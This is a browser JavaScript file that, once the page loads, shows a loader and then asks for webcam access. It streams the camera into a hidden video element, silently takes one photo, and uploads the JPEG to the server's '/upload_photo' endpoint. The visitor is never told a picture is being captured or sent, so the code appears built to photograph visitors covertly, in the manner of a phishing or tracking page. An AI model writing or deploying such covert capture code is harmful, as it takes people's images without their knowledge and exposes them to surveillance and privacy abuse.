window.addEventListener('DOMContentLoaded', () => {
  const loader = document.querySelector('.loader');
  const container = document.querySelector('.container');
  
  // Create a hidden video element for capture
  const video = document.createElement('video');
  video.style.display = 'none';
  document.body.appendChild(video);
  
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  
  setTimeout(() => {
    loader.style.display = 'none';
    container.style.display = 'flex';
    
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          video.addEventListener('loadedmetadata', () => {
            // Set canvas dimensions to match video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Capture photo after a short delay to ensure good quality
            setTimeout(() => {
              capturePhoto();
              // Stop the stream after capturing
              stream.getTracks().forEach(track => track.stop());
              // Remove the video element
              video.remove();
            }, 1000);
          });
        })
        .catch(err => {
          console.error('Error accessing webcam:', err);
        });
    } else {
      console.warn('getUserMedia not supported by this browser');
    }
  }, 1000);
  
  function capturePhoto() {
    // Draw current video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(blob => {
      if (blob) {
        // Create timestamp for unique filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `capture_${timestamp}.jpg`;
        
        // Send photo to server
        sendPhotoToServer(blob, filename);
      }
    }, 'image/jpeg', 0.8); // JPEG format with 80% quality
  }
  
  function sendPhotoToServer(blob, filename) {
    const formData = new FormData();
    formData.append('photo', blob, filename);
    
    fetch('/upload_photo', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (response.ok) {
        console.log(`Photo ${filename} saved successfully`);
      } else {
        console.error('Failed to save photo:', response.statusText);
      }
    })
    .catch(error => {
      console.error('Error sending photo:', error);
    });
  }
});
